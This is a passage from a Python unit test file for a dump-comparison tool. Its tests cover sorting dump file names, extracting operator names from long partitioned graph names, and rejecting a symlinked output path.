                       "Cast.trans_Cast_1238.105.9.1670295569938497",
                       "Cast.trans_Cast_1238.105.9.2670295569938495"]
        ret = dump_utils.sort_dump_file_list(dump_file_type, dump_file_list)
        self.assertEqual(ret, sorted_list)

    def test_sort_dump_file_list2(self):
        dump_file_list = ["Conv2D.Conv2D_lxslice0.2.9.1670205069987341.4.330.0.0",
                          "Conv2D.Conv2D_lxslice2.2.9.1670205069987342.4.330.0.0",
                          "Conv2D.Conv2D_lxslice1.2.9.1670205069987343.4.330.0.0"]
        dump_file_type = ConstManager.MANUAL_MODE
        sorted_list = ["Conv2D.Conv2D_lxslice0.2.9.1670205069987341.4.330.0.0",
                       "Conv2D.Conv2D_lxslice1.2.9.1670205069987343.4.330.0.0",
                       "Conv2D.Conv2D_lxslice2.2.9.1670205069987342.4.330.0.0"]
        ret = dump_utils.sort_dump_file_list(dump_file_type, dump_file_list)
        self.assertEqual(ret, sorted_list)

    def test_handle_op_name1(self):
        fusion_json_file_path = ""
        file_op_name = "partition0_rank2_new_sub_graph15_sgt_graph_0_fp32_vars_conv2d_18_Conv2D_lxslice0"
        op_name = "fp32_vars_conv2d_18_Conv2D"
        ret = dump.handle_op_name(file_op_name, fusion_json_file_path)
        self.assertEqual(ret, op_name)

    def test_handle_op_name2(self):
        fusion_json_file_path = ""
        file_op_name = "partition0_rank2_new_sub_graph15_sgt_graph_0_L2Loss_6"
        op_name = "L2Loss_6"
        ret = dump.handle_op_name(file_op_name, fusion_json_file_path)
        self.assertEqual(ret, op_name)

    def test_handle_op_name3(self):
        fusion_json_file_path = ""
        file_op_name = "partition0_rank2_new_sub_graph15_sgt_graph_0_loss_scale_gradients_AddN_42partition0_rank2" \
                       "_new_sub_graph15_sgt_graph_0_loss_scale_gradients_fp32_vars_Relu_18_grad_ReluGrad"
        op_name = "loss_scale_gradients_fp32_vars_Relu_18_grad_ReluGrad"
        ret = dump.handle_op_name(file_op_name, fusion_json_file_path)
        self.assertEqual(ret, op_name)

    def test_handle_op_name4(self):
        fusion_json_file_path = ""
        file_op_name = "partition0_rank2_new_sub_graph15_sgt_graph_0_fp32_vars_BatchNorm_44_FusedBatchNormV3_Update_" \
                       "lxslice0partition0_rank2_new_sub_graph15_sgt_graph_0_fp32_vars_Relu_40_lxslice0"
        op_name = "fp32_vars_Relu_40_lxslice0"
        ret = dump.handle_op_name(file_op_name, fusion_json_file_path)
        self.assertEqual(ret, op_name)

    def test_handle_op_name5(self):
        fusion_json_file_path = "/home/ffts.json"
        file_op_name = "partition0_rank1_new_sub_graph15_sgt_graph_0_bert_encoder_layer_0_output_dense_MatMul_lxslice0"
        op_name = "partition0_rank1_new_sub_graph15_sgt_graph_0_bert_encoder_layer_0_output_dense_MatMul"
        ret = dump.handle_op_name(file_op_name, fusion_json_file_path)
        self.assertEqual(ret, op_name)

    def test_handle_op_name6(self):
        fusion_json_file_path = "/home/ffts.json"
        file_op_name = "partition0_rank1_new_sub_graph15_sgt_graph_0_bert_encoder_layer_7_attention_self_mul_1" \
                       "_lxslice0partition0_rank1_new_sub_graph15_sgt_graph_0_trans_Cast_1786_lxslice0"
        op_name = "partition0_rank1_new_sub_graph15_sgt_graph_0_bert_encoder_layer_7_attention_self_mul_1" \
                  "partition0_rank1_new_sub_graph15_sgt_graph_0_trans_Cast_1786"
        ret = dump.handle_op_name(file_op_name, fusion_json_file_path)
        self.assertEqual(ret, op_name)

    def test_check_output_path_valid_softlink_path_raises_error(self):
        with mock.patch("os.path.islink", return_value=True):
            ret = path_check.check_output_path_valid('/home/output_path', exist=True)
        # 验证异常类型和错误码
        assert ret == CompareError.MSACCUCMP_INVALID_PATH_ERROR

if __name__ == '__main__':
    unittest.main()
